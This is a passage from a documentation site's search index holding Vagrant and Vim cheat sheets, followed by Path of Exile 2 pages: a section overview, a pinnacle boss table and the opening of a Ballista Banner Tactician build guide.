Startup","text":"<pre><code># Initialize a new Vagrant project\nvagrant init ubuntu/focal64\nvagrant init hashicorp/bionic64\n\n# Start the virtual machine\nvagrant up\n\n# Start with a specific provider\nvagrant up --provider=virtualbox\nvagrant up --provider=vmware_desktop\n\n# Start and force provisioning\nvagrant up --provision\n\n# Connect via SSH\nvagrant ssh\n\n# Execute a command via SSH\nvagrant ssh -c \"ls -la\"\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#lifecycle-management","title":"Lifecycle Management","text":"<pre><code># Display status\nvagrant status                 # Current machine\nvagrant global-status          # All machines\n\n# Restart\nvagrant reload                 # Restart\nvagrant reload --provision     # With re-provisioning\n\n# Stop\nvagrant halt                   # Clean shutdown\nvagrant suspend                # Suspend (faster)\n\n# Start after suspend\nvagrant resume\n\n# Completely remove\nvagrant destroy\nvagrant destroy -f             # Without confirmation\n\n# Clean up old machines\nvagrant global-status --prune\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#box-management","title":"Box Management","text":"<pre><code># List installed boxes\nvagrant box list\n\n# Add a box\nvagrant box add ubuntu/focal64\nvagrant box add hashicorp/bionic64\n\n# Update a box\nvagrant box update\n\n# Remove a box\nvagrant box remove ubuntu/focal64\nvagrant box remove ubuntu/focal64 --box-version 20230215.0.0\n\n# Remove old versions\nvagrant box prune\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#snapshots","title":"Snapshots","text":"<pre><code># Create a snapshot\nvagrant snapshot save snapshot_name\n\n# List snapshots\nvagrant snapshot list\n\n# Restore a snapshot\nvagrant snapshot restore snapshot_name\n\n# Delete a snapshot\nvagrant snapshot delete snapshot_name\n\n# Return to the last snapshot\nvagrant snapshot pop\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#provisioning","title":"Provisioning","text":"<pre><code># Provision a running machine\nvagrant provision\n\n# Provision with a specific provisioner\nvagrant provision --provision-with shell\nvagrant provision --provision-with ansible\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#networking-and-ssh","title":"Networking and SSH","text":"<pre><code># View SSH config\nvagrant ssh-config\n\n# Use with standard SSH\nvagrant ssh-config &gt;&gt; ~/.ssh/config\nssh default\n\n# Forward ports manually\nvagrant port\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#vagrantfile-configuration","title":"Vagrantfile - Configuration","text":""},{"location":"cheat-sheet/vagrant/vagrant/#basic-structure","title":"Basic Structure","text":"<pre><code># -*- mode: ruby -*-\n# vi: set ft=ruby :\n\nVagrant.configure(\"2\") do |config|\n  # Box selection\n  config.vm.box = \"ubuntu/focal64\"\n  config.vm.box_version = \"20230215.0.0\"\n\n  # Machine name\n  config.vm.hostname = \"dev-server\"\n\n  # Network configuration\n  config.vm.network \"forwarded_port\", guest: 80, host: 8080\n\n  # VirtualBox provider\n  config.vm.provider \"virtualbox\" do |vb|\n    vb.name = \"dev-vm\"\n    vb.memory = \"2048\"\n    vb.cpus = 2\n  end\n\n  # Provisioning\n  config.vm.provision \"shell\", inline: &lt;&lt;-SHELL\n    apt-get update\n    apt-get install -y nginx\n  SHELL\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#network-configuration","title":"Network Configuration","text":""},{"location":"cheat-sheet/vagrant/vagrant/#port-forwarding","title":"Port Forwarding","text":"<pre><code># Simple port forwarding\nconfig.vm.network \"forwarded_port\", guest: 80, host: 8080\n\n# Multiple ports\nconfig.vm.network \"forwarded_port\", guest: 80, host: 8080\nconfig.vm.network \"forwarded_port\", guest: 443, host: 8443\nconfig.vm.network \"forwarded_port\", guest: 3306, host: 3306\n\n# With specific protocol\nconfig.vm.network \"forwarded_port\", guest: 80, host: 8080, protocol: \"tcp\"\n\n# On a specific interface\nconfig.vm.network \"forwarded_port\", guest: 80, host: 8080, host_ip: \"127.0.0.1\"\n\n# Avoid collisions\nconfig.vm.network \"forwarded_port\", guest: 80, host: 8080, auto_correct: true\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#private-network","title":"Private Network","text":"<pre><code># Static IP\nconfig.vm.network \"private_network\", ip: \"192.168.33.10\"\n\n# DHCP\nconfig.vm.network \"private_network\", type: \"dhcp\"\n\n# With network name\nconfig.vm.network \"private_network\",\n  ip: \"192.168.33.10\",\n  virtualbox__intnet: \"my_network\"\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#public-network","title":"Public Network","text":"<pre><code># Public DHCP\nconfig.vm.network \"public_network\"\n\n# Bridge on a specific interface\nconfig.vm.network \"public_network\", bridge: \"en0: Wi-Fi (Wireless)\"\n\n# Static IP on public network\nconfig.vm.network \"public_network\", ip: \"192.168.1.100\"\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#shared-folders","title":"Shared Folders","text":"<pre><code># Default mount (./  =&gt; /vagrant)\nconfig.vm.synced_folder \".\", \"/vagrant\"\n\n# Custom folder\nconfig.vm.synced_folder \"./src\", \"/var/www/html\"\n\n# Multiple folders\nconfig.vm.synced_folder \"./app\", \"/opt/app\"\nconfig.vm.synced_folder \"./data\", \"/data\"\n\n# Specific mount type\nconfig.vm.synced_folder \".\", \"/vagrant\", type: \"nfs\"\nconfig.vm.synced_folder \".\", \"/vagrant\", type: \"rsync\"\n\n# Mount options\nconfig.vm.synced_folder \".\", \"/vagrant\",\n  owner: \"www-data\",\n  group: \"www-data\",\n  mount_options: [\"dmode=775,fmode=664\"]\n\n# Disable default folder\nconfig.vm.synced_folder \".\", \"/vagrant\", disabled: true\n\n# NFS (more performant on Mac/Linux)\nconfig.vm.synced_folder \".\", \"/vagrant\",\n  type: \"nfs\",\n  nfs_version: 4,\n  nfs_udp: false\n\n# Rsync (unidirectional)\nconfig.vm.synced_folder \".\", \"/vagrant\",\n  type: \"rsync\",\n  rsync__exclude: [\".git/\", \"node_modules/\"]\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#provider-configuration","title":"Provider Configuration","text":""},{"location":"cheat-sheet/vagrant/vagrant/#virtualbox","title":"VirtualBox","text":"<pre><code>config.vm.provider \"virtualbox\" do |vb|\n  # VM name\n  vb.name = \"my-dev-vm\"\n\n  # Resources\n  vb.memory = \"4096\"\n  vb.cpus = 2\n\n  # Graphical interface\n  vb.gui = false\n\n  # Advanced customizations\n  vb.customize [\"modifyvm\", :id, \"--natdnshostresolver1\", \"on\"]\n  vb.customize [\"modifyvm\", :id, \"--natdnsproxy1\", \"on\"]\n  vb.customize [\"modifyvm\", :id, \"--ioapic\", \"on\"]\n\n  # Linked clone (faster)\n  vb.linked_clone = true\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#vmware","title":"VMware","text":"<pre><code>config.vm.provider \"vmware_desktop\" do |vmware|\n  vmware.vmx[\"memsize\"] = \"4096\"\n  vmware.vmx[\"numvcpus\"] = \"2\"\n  vmware.gui = false\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#provisioning_1","title":"Provisioning","text":""},{"location":"cheat-sheet/vagrant/vagrant/#inline-shell-script","title":"Inline Shell Script","text":"<pre><code>config.vm.provision \"shell\", inline: &lt;&lt;-SHELL\n  apt-get update\n  apt-get install -y nginx\n  systemctl enable nginx\n  systemctl start nginx\nSHELL\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#external-shell-script","title":"External Shell Script","text":"<pre><code>config.vm.provision \"shell\", path: \"scripts/setup.sh\"\n\n# With arguments\nconfig.vm.provision \"shell\",\n  path: \"scripts/setup.sh\",\n  args: [\"arg1\", \"arg2\"]\n\n# As a specific user\nconfig.vm.provision \"shell\",\n  path: \"scripts/setup.sh\",\n  privileged: false  # Execute as vagrant user\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#ansible","title":"Ansible","text":"<pre><code>config.vm.provision \"ansible\" do |ansible|\n  ansible.playbook = \"playbook.yml\"\n  ansible.inventory_path = \"inventory\"\n  ansible.limit = \"all\"\n  ansible.verbose = \"v\"\n\n  ansible.extra_vars = {\n    env: \"development\",\n    version: \"1.0.0\"\n  }\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#docker","title":"Docker","text":"<pre><code># Install Docker\nconfig.vm.provision \"docker\"\n\n# Pull images\nconfig.vm.provision \"docker\" do |d|\n  d.pull_images \"nginx\"\n  d.pull_images \"postgres:15\"\n  d.pull_images \"redis:7-alpine\"\nend\n\n# Run containers\nconfig.vm.provision \"docker\" do |d|\n  d.run \"nginx\",\n    args: \"-p 80:80 -v /vagrant:/usr/share/nginx/html\"\nend\n\n# Docker Compose\nconfig.vm.provision \"docker_compose\" do |docker_compose|\n  docker_compose.yml = \"/vagrant/docker-compose.yml\"\n  docker_compose.rebuild = true\n  docker_compose.run = \"always\"\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#multiple-provisioning","title":"Multiple Provisioning","text":"<pre><code># Execution order\nconfig.vm.provision \"shell\", inline: \"echo 'First'\"\nconfig.vm.provision \"shell\", inline: \"echo 'Second'\"\n\n# With names\nconfig.vm.provision \"bootstrap\", type: \"shell\", inline: \"apt-get update\"\nconfig.vm.provision \"install\", type: \"shell\", inline: \"apt-get install -y nginx\"\n\n# Run only specific ones\n# vagrant provision --provision-with bootstrap\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#multi-machine","title":"Multi-Machine","text":"<pre><code>Vagrant.configure(\"2\") do |config|\n  config.vm.box = \"ubuntu/focal64\"\n\n  # Web machine\n  config.vm.define \"web\" do |web|\n    web.vm.hostname = \"web-server\"\n    web.vm.network \"private_network\", ip: \"192.168.33.10\"\n\n    web.vm.provider \"virtualbox\" do |vb|\n      vb.memory = \"1024\"\n      vb.cpus = 1\n    end\n\n    web.vm.provision \"shell\", inline: &lt;&lt;-SHELL\n      apt-get update\n      apt-get install -y nginx\n    SHELL\n  end\n\n  # Database machine\n  config.vm.define \"db\" do |db|\n    db.vm.hostname = \"db-server\"\n    db.vm.network \"private_network\", ip: \"192.168.33.11\"\n\n    db.vm.provider \"virtualbox\" do |vb|\n      vb.memory = \"2048\"\n      vb.cpus = 2\n    end\n\n    db.vm.provision \"shell\", inline: &lt;&lt;-SHELL\n      apt-get update\n      apt-get install -y postgresql\n    SHELL\n  end\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#conditional-configuration","title":"Conditional Configuration","text":"<pre><code>Vagrant.configure(\"2\") do |config|\n  # Based on host OS\n  if Vagrant::Util::Platform.windows?\n    config.vm.synced_folder \".\", \"/vagrant\", type: \"smb\"\n  elsif Vagrant::Util::Platform.darwin?\n    config.vm.synced_folder \".\", \"/vagrant\", type: \"nfs\"\n  else\n    config.vm.synced_folder \".\", \"/vagrant\", type: \"virtualbox\"\n  end\n\n  # Environment variables\n  memory = ENV['VAGRANT_MEMORY'] || \"1024\"\n  cpus = ENV['VAGRANT_CPUS'] || \"1\"\n\n  config.vm.provider \"virtualbox\" do |vb|\n    vb.memory = memory\n    vb.cpus = cpus\n  end\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#practical-examples","title":"Practical Examples","text":""},{"location":"cheat-sheet/vagrant/vagrant/#lamp-stack","title":"LAMP Stack","text":"<pre><code>Vagrant.configure(\"2\") do |config|\n  config.vm.box = \"ubuntu/focal64\"\n  config.vm.hostname = \"lamp-server\"\n\n  config.vm.network \"private_network\", ip: \"192.168.33.10\"\n  config.vm.network \"forwarded_port\", guest: 80, host: 8080\n\n  config.vm.synced_folder \"./www\", \"/var/www/html\",\n    owner: \"www-data\",\n    group: \"www-data\"\n\n  config.vm.provider \"virtualbox\" do |vb|\n    vb.name = \"LAMP-Dev\"\n    vb.memory = \"2048\"\n    vb.cpus = 2\n  end\n\n  config.vm.provision \"shell\", inline: &lt;&lt;-SHELL\n    # Update\n    apt-get update\n\n    # Apache\n    apt-get install -y apache2\n\n    # MySQL\n    debconf-set-selections &lt;&lt;&lt; 'mysql-server mysql-server/root_password password root'\n    debconf-set-selections &lt;&lt;&lt; 'mysql-server mysql-server/root_password_again password root'\n    apt-get install -y mysql-server\n\n    # PHP\n    apt-get install -y php libapache2-mod-php php-mysql\n\n    # Enable mod_rewrite\n    a2enmod rewrite\n    systemctl restart apache2\n  SHELL\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#docker-environment","title":"Docker Environment","text":"<pre><code>Vagrant.configure(\"2\") do |config|\n  config.vm.box = \"ubuntu/focal64\"\n  config.vm.hostname = \"docker-host\"\n\n  config.vm.network \"private_network\", ip: \"192.168.33.20\"\n\n  config.vm.provider \"virtualbox\" do |vb|\n    vb.name = \"Docker-Dev\"\n    vb.memory = \"4096\"\n    vb.cpus = 2\n  end\n\n  # Install Docker\n  config.vm.provision \"docker\"\n\n  # Install Docker Compose\n  config.vm.provision \"shell\", inline: &lt;&lt;-SHELL\n    curl -L \"https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)\" \\\n      -o /usr/local/bin/docker-compose\n    chmod +x /usr/local/bin/docker-compose\n  SHELL\n\n  # Start containers\n  config.vm.provision \"docker_compose\" do |compose|\n    compose.yml = \"/vagrant/docker-compose.yml\"\n  end\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#multi-node-cluster","title":"Multi-Node Cluster","text":"<pre><code>Vagrant.configure(\"2\") do |config|\n  config.vm.box = \"ubuntu/focal64\"\n\n  # Define number of workers\n  NUM_WORKERS = 3\n\n  # Master node\n  config.vm.define \"master\" do |master|\n    master.vm.hostname = \"k8s-master\"\n    master.vm.network \"private_network\", ip: \"192.168.33.10\"\n\n    master.vm.provider \"virtualbox\" do |vb|\n      vb.memory = \"2048\"\n      vb.cpus = 2\n    end\n\n    master.vm.provision \"shell\", path: \"scripts/k8s-master.sh\"\n  end\n\n  # Worker nodes\n  (1..NUM_WORKERS).each do |i|\n    config.vm.define \"worker-#{i}\" do |worker|\n      worker.vm.hostname = \"k8s-worker-#{i}\"\n      worker.vm.network \"private_network\", ip: \"192.168.33.#{10 + i}\"\n\n      worker.vm.provider \"virtualbox\" do |vb|\n        vb.memory = \"1024\"\n        vb.cpus = 1\n      end\n\n      worker.vm.provision \"shell\", path: \"scripts/k8s-worker.sh\"\n    end\n  end\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#useful-plugins","title":"Useful Plugins","text":""},{"location":"cheat-sheet/vagrant/vagrant/#plugin-installation","title":"Plugin Installation","text":"<pre><code># Install a plugin\nvagrant plugin install vagrant-vbguest\n\n# List plugins\nvagrant plugin list\n\n# Update plugins\nvagrant plugin update\n\n# Uninstall a plugin\nvagrant plugin uninstall vagrant-vbguest\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#popular-plugins","title":"Popular Plugins","text":"<pre><code># vagrant-vbguest: Automatically updates Guest Additions\nvagrant plugin install vagrant-vbguest\n\n# vagrant-hostmanager: Manages /etc/hosts automatically\nvagrant plugin install vagrant-hostmanager\n\n# vagrant-disksize: Resize disks\nvagrant plugin install vagrant-disksize\n\n# vagrant-env: Load variables from .env\nvagrant plugin install vagrant-env\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#plugin-usage","title":"Plugin Usage","text":""},{"location":"cheat-sheet/vagrant/vagrant/#vagrant-vbguest","title":"vagrant-vbguest","text":"<pre><code>config.vbguest.auto_update = true\nconfig.vbguest.no_remote = false\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#vagrant-hostmanager","title":"vagrant-hostmanager","text":"<pre><code>config.hostmanager.enabled = true\nconfig.hostmanager.manage_host = true\nconfig.hostmanager.manage_guest = true\n\nconfig.vm.define \"web\" do |web|\n  web.vm.hostname = \"web.local\"\n  web.vm.network \"private_network\", ip: \"192.168.33.10\"\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#vagrant-disksize","title":"vagrant-disksize","text":"<pre><code>config.disksize.size = \"50GB\"\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/vagrant/vagrant/#project-organization","title":"Project Organization","text":"<pre><code>project/\n  Vagrantfile\n  README.md\n  .vagrant/          # Generated, ignore in git\n  scripts/\n    setup.sh\n    provision.sh\n  ansible/\n    playbook.yml\n  docker/\n    docker-compose.yml\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#gitignore-file","title":".gitignore File","text":"<pre><code>.vagrant/\n*.box\n.DS_Store\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#environment-variables","title":"Environment Variables","text":"<pre><code># .env\nVAGRANT_MEMORY=2048\nVAGRANT_CPUS=2\n</code></pre> <pre><code># Vagrantfile\nrequire 'dotenv'\nDotenv.load\n\nVagrant.configure(\"2\") do |config|\n  config.vm.provider \"virtualbox\" do |vb|\n    vb.memory = ENV['VAGRANT_MEMORY'] || \"1024\"\n    vb.cpus = ENV['VAGRANT_CPUS'] || \"1\"\n  end\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#performance-optimization","title":"Performance Optimization","text":""},{"location":"cheat-sheet/vagrant/vagrant/#nfs-for-shared-folders-maclinux","title":"NFS for Shared Folders (Mac/Linux)","text":"<pre><code>config.vm.synced_folder \".\", \"/vagrant\",\n  type: \"nfs\",\n  nfs_version: 4,\n  nfs_udp: false\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#package-cache","title":"Package Cache","text":"<pre><code># With vagrant-cachier plugin\nif Vagrant.has_plugin?(\"vagrant-cachier\")\n  config.cache.scope = :box\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#linked-clones","title":"Linked Clones","text":"<pre><code>config.vm.provider \"virtualbox\" do |vb|\n  vb.linked_clone = true\nend\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#troubleshooting","title":"Troubleshooting","text":""},{"location":"cheat-sheet/vagrant/vagrant/#common-issues","title":"Common Issues","text":"<pre><code># Completely reset\nvagrant destroy -f\nvagrant box remove ubuntu/focal64\nvagrant up\n\n# Network issues\nvagrant reload --provision\n\n# Shared folder issues\nvagrant plugin install vagrant-vbguest\nvagrant vbguest --do install --no-cleanup\n\n# Check logs\nvagrant up --debug 2&gt;&amp;1 | tee vagrant.log\n\n# Clean up old machines\nvagrant global-status --prune\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#debug-commands","title":"Debug Commands","text":"<pre><code># Full debug mode\nVAGRANT_LOG=debug vagrant up\n\n# View SSH details\nvagrant ssh-config\n\n# Verify configuration\nvagrant validate\n</code></pre>"},{"location":"cheat-sheet/vagrant/vagrant/#resources","title":"Resources","text":"<ul> <li>Official documentation: https://www.vagrantup.com/docs</li> <li>Vagrant Cloud (Boxes): https://app.vagrantup.com/boxes/search</li> <li>GitHub: https://github.com/hashicorp/vagrant</li> <li>Community: https://discuss.hashicorp.com/c/vagrant</li> </ul> <p>This Vagrant guide covers the essentials for creating and efficiently managing reproducible virtualized development environments.</p>"},{"location":"cheat-sheet/vim/vim/","title":"\ufffd Vim Cheat Sheet","text":""},{"location":"cheat-sheet/vim/vim/#modes","title":"\u2699\ufe0f Modes","text":"Mode Description How to enter Normal Default mode (navigate, edit commands) Press <code>Esc</code> Insert Type and insert text <code>i</code>, <code>I</code>, <code>a</code>, or <code>A</code> Visual Select text <code>v</code> (character), <code>V</code> (line), <code>Ctrl+v</code> (block) Command-line Run commands (save, quit, etc.) <code>:</code> from Normal mode"},{"location":"cheat-sheet/vim/vim/#navigation","title":"\ufffd Navigation","text":"Command Action <code>h</code> / <code>j</code> / <code>k</code> / <code>l</code> Move left / down / up / right <code>0</code> Beginning of line <code>$</code> End of line <code>w</code> / <code>b</code> Next / previous word <code>gg</code> Go to start of file <code>G</code> Go to end of file <code>:n</code> Go to line n (e.g., <code>:42</code>) <code>Ctrl+d</code> / <code>Ctrl+u</code> Scroll half page down / up <code>Ctrl+f</code> / <code>Ctrl+b</code> Scroll full page down / up"},{"location":"cheat-sheet/vim/vim/#insert-mode","title":"\u270f\ufe0f Insert Mode","text":"Command Action <code>i</code> Insert before cursor <code>I</code> Insert at beginning of line <code>a</code> Append after cursor <code>A</code> Append at end of line <code>o</code> Open new line below <code>O</code> Open new line above <code>Esc</code> Return to Normal mode"},{"location":"cheat-sheet/vim/vim/#editing","title":"\ufffd Editing","text":"Command Action <code>x</code> Delete character under cursor <code>dd</code> Delete current line <code>D</code> Delete to end of line <code>dw</code> Delete word <code>u</code> Undo <code>Ctrl+r</code> Redo <code>yy</code> Yank (copy) current line <code>p</code> Paste below <code>P</code> Paste above <code>r&lt;char&gt;</code> Replace single character <code>cw</code> Change word (delete + insert) <code>cc</code> Change entire line <code>J</code> Join current and next line"},{"location":"cheat-sheet/vim/vim/#search-replace","title":"\ufffd Search &amp; Replace","text":"Command Action <code>/pattern</code> Search forward <code>?pattern</code> Search backward <code>n</code> / <code>N</code> Next / previous match <code>:%s/old/new/g</code> Replace all in file <code>:s/old/new/g</code> Replace all in current line <code>:%s/old/new/gc</code> Replace all (confirm each)"},{"location":"cheat-sheet/vim/vim/#files-saving","title":"\ufffd Files &amp; Saving","text":"Command Action <code>:w</code> Save file <code>:q</code> Quit <code>:wq</code> or <code>:x</code> Save and quit <code>:q!</code> Quit without saving <code>:e filename</code> Open file <code>:saveas newfile</code> Save as new file <code>:ls</code> List open buffers <code>:bn</code> / <code>:bp</code> Next / previous buffer"},{"location":"cheat-sheet/vim/vim/#useful-tricks","title":"\u26a1 Useful Tricks","text":"Command Action <code>.</code> Repeat last command <code>&gt;&gt;</code> / <code>&lt;&lt;</code> Indent / unindent line <code>=</code> Auto-indent selection <code>Ctrl+g</code> Show file info <code>%</code> Jump to matching bracket/parenthesis <code>:help &lt;command&gt;</code> Open Vim help for a command"},{"location":"cheat-sheet/vim/vim/#example-workflow","title":"\ufffd Example Workflow","text":"<ol> <li>Open file \u2192 <code>vim myfile.txt</code></li> <li>Move to a line \u2192 <code>gg</code> or <code>/word</code></li> <li>Edit \u2192 <code>i</code> (insert mode), then <code>Esc</code></li> <li>Save \u2192 <code>:w</code></li> <li>Quit \u2192 <code>:q</code></li> </ol> <p>\u2705 Tip: You can combine counts with commands \u2014 For example, <code>3dd</code> deletes 3 lines, <code>5w</code> moves forward 5 words.</p>"},{"location":"games/","title":"Overview","text":"<p>Welcome to the game guides section!</p> <p>This section contains guides, builds, and configurations for various games.</p>"},{"location":"games/#available-games","title":"Available Games","text":""},{"location":"games/#path-of-exile-2","title":"Path of Exile 2","text":"<ul> <li>General Guide - Introduction and general resources</li> <li>Build Guides - Detailed build guides</li> <li>Settings - Optimal configuration and settings</li> </ul>"},{"location":"games/#starcraft-2","title":"StarCraft 2","text":"<ul> <li>General Guide - Introduction and general resources</li> <li>Settings - Optimal configuration and settings</li> </ul> <p>Contributions</p> <p>These guides are based on personal experience and community best practices. Feel free to adapt them to your playstyle!</p>"},{"location":"games/poe2/","title":"Path of Exile 2","text":"<p>Welcome to the Path of Exile 2 section!</p>"},{"location":"games/poe2/#overview","title":"Overview","text":"<p>Path of Exile 2 is a free-to-play Action RPG developed by Grinding Gear Games. This section contains guides, builds, and resources to help you master the game.</p>"},{"location":"games/poe2/#available-content","title":"Available Content","text":""},{"location":"games/poe2/#build-guides","title":"Build Guides","text":"<ul> <li>Ballista Banner Tactician - Effective league starter build using ballistas</li> </ul>"},{"location":"games/poe2/#configuration","title":"Configuration","text":"<ul> <li>Optimal Settings - Game configuration for better performance</li> </ul>"},{"location":"games/poe2/#external-resources","title":"External Resources","text":""},{"location":"games/poe2/#community-sites","title":"Community Sites","text":"<ul> <li>Official Path of Exile 2 Website</li> <li>Mobalytics PoE2 - Detailed builds and guides</li> <li>Reddit PoE2 - Active community</li> </ul>"},{"location":"games/poe2/#useful-tools","title":"Useful Tools","text":"<ul> <li>Build Planners - Tools to plan your builds</li> <li>Trade Tools - Trading and pricing tools</li> <li>Atlas Calculators - Atlas optimization</li> </ul> <p>Tips for Beginners</p> <p>If you're new to Path of Exile 2, start with our Ballista Banner Tactician build which is perfect for league starters!</p> <p>Early Access</p> <p>Path of Exile 2 is currently in Early Access. Content and builds may change frequently with updates.</p>"},{"location":"games/poe2/bosses/pinnacles/","title":"\ufffd Path of Exile 2 \u2013 Pinnacle Bosses","text":"Boss Type / Context Location / Access Main Mechanics The Arbiter of Ash Atlas \u2013 Fire / Elemental Access via Crisis Fragments (Iron, Copper, Stone Citadels) Two phases: physical and fire damage, burning ground zones, elemental orbs that change terrain type, flame bombs with safe zones. Xesht, We That Are One Breach Use a Breachstone at the Realmgate Arena fight with enemy waves, the boss merges with its clones, heavy physical/chaos damage, corrupted ground zones. Olroth, Origin of Fall Expedition Found in a Kalguuran Tomb (Expedition Logbook, area \u2265 79) Fire explosions, totems empowering the boss, summons Kalguuran spirits, destroys part of the arena during final phase. The King in the Mists Ritual Use the invitation \u201cAn Audience with the King\u201d at the Realmgate Multi-phase fight with ritual ghost summons, shadow zones that deal damage, spirit projectiles, frequent teleporting and cloning. Omniphobia, Fear Manifest Delirium / Simulacrum High waves in the Simulacrum Massive melee boss. Ground slams, fear projectiles, creates \u201cDelirium debuff\u201d stacks. Kosis, The Revelation Delirium / Simulacrum Final waves of the Simulacrum Chaos and physical damage, rotating beams, energy explosions, self-heals during add phases. Zarokh, The Temporal Trials of Sekhemas Final room of the 4<sup>th</sup> floor Trial Boomerang-style projectiles, temporal portals, orbs passing through portals, \u201ctime trial\u201d minigame (collect hourglasses to avoid instant death). The Trialmaster Trial of Chaos After the 10<sup>th</sup> Trial, using the three \u201cFate Keys\u201d Manipulates time (stops or slows it), powerful melee attacks, shadow explosions, chaos projectiles. Positioning is key. Eshmir, the Endless Warden Atlas \u2013 Water / Frost Invitation \u201cEchoes of the Deep\u201d Creates waves and geysers, manipulates water level, freezes the player, summons adds near phase transitions. Nehil, Voice of the Abyss Atlas \u2013 Shadow / Chaos Invitation \u201cWhisper from the Deep\u201d Darkness and shadow mechanics, limited vision zones, clones reflecting damage, frequent teleports. Ahr\u00fbn, the Dawnseeker Atlas \u2013 Light / Lightning Invitation \u201cStorm\u2019s Summit\u201d Lightning storm mechanics: thunder strikes, conductive zones, bouncing projectiles, invulnerable channel phase. Erebrix, the Plague Herald Atlas \u2013 Poison / Decay Invitation \u201cGarden of Rot\u201d Spreads toxic spores, creates rot zones, summons insect swarms that explode on death. Requires constant movement. <p>\ufffd Notes: - Atlas Invitations (\u201cEchoes of the Deep\u201d, \u201cStorm\u2019s Summit\u201d, etc.) drop from endgame content or are crafted from Crisis Fragments. - Some Pinnacle Bosses have Uber versions with new patterns and faster attack sequences (e.g. The Arbiter of Ash \u2013 Uber version). - All Pinnacle encounters are endgame-tier (area level 83+), requiring a fully developed build.</p>"},{"location":"games/poe2/builds/ballista-banner-tactician/","title":"Lazy's Ballista Banner Tactician Build","text":"<p>Class: Mercenary Ascendancy: Tactician League: 0.3 League Starter to End Game Author: Lazy Exile Updated: September 30, 2025</p>"},{"location":"games/poe2/builds/ballista-banner-tactician/#overview","title":"Overview","text":"<p>A totem-based build revolving around Ballista Totem (Mortar Cannon) and Banners (War Banner, Defiance Banner) with a dual curse setup (Elemental Weakness, Temporal Chains). This is a comfortable totem playstyle where you drop totems and let them do the work while you focus on positioning and survival.</p>"},{"location":"games/poe2/builds/ballista-banner-tactician/#build-summary","title":"Build Summary","text":""},{"location":"games/poe2/builds/ballista-banner-tactician/#defensive-features","title":"Defensive Features","text":"<ul> <li>Pinning mechanics provide excellent crowd control on Tactician</li> <li>Armour and Evasion hybrid setup for decent tankiness  </li> <li>Drop and run playstyle - place totems and dodge while they fight</li> <li>Enemies are often killed before they can retaliate</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#offensive-features","title":"Offensive Features","text":"<ul> <li>Mortar Cannon with 100% uptime through pinning mechanics</li> <li>Dual Curse setup (Elemental Weakness + Frost Bomb) is stronger than traditional crossbow builds due to Sceptre usage</li> <li>Critical strike scaling in endgame provides sufficient damage for pinnacle bossing</li> <li>Totems rarely die when positioned correctly</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#content-viability","title":"Content Viability","text":"<p>\u2705 Excellent for: - Mapping - Ritual (Banner + Totem excels at stationary content) - Abyss  - Essence - Bossing (strong scaling vectors for endgame)</p>"},{"location":"games/poe2/builds/ballista-banner-tactician/#strengths-weaknesses","title":"Strengths &amp; Weaknesses","text":""},{"location":"games/poe2/builds/ballista-banner-tactician/#strengths","title":"\u2705 Strengths","text":"<ul> <li>Unique Ballista/Totem playstyle</li> <li>Beginner friendly</li> <li>Strong early game performance</li> <li>Scales well into late game</li> <li>Endgame version can clear pinnacle bosses</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#weaknesses","title":"\u274c Weaknesses","text":"<ul> <li>Banner management requires extra button presses</li> <li>Visual clarity issues (might be overwhelming)</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#campaign-bonuses","title":"Campaign Bonuses","text":""},{"location":"games/poe2/builds/ballista-banner-tactician/#valley-of-the-titans-act-2","title":"Valley of the Titans (Act 2)","text":"<ul> <li>30% Increased Charm Effect Duration &amp; +1 Charm Slot</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#the-venom-crypts","title":"The Venom Crypts","text":"<ul> <li>30% Elemental Ailment Threshold</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#hall-of-the-dead","title":"Hall of the Dead","text":"<ul> <li>+5 Strength, +5 Dexterity, +5 Intelligence</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#act-52-qimah-7-pillars","title":"Act 5.2 - Qimah - 7 Pillars","text":"<p>Priority order: 1. 3% increased Movement Speed (best choice) 2. +5% to Elemental Resistances (if lacking resistances) 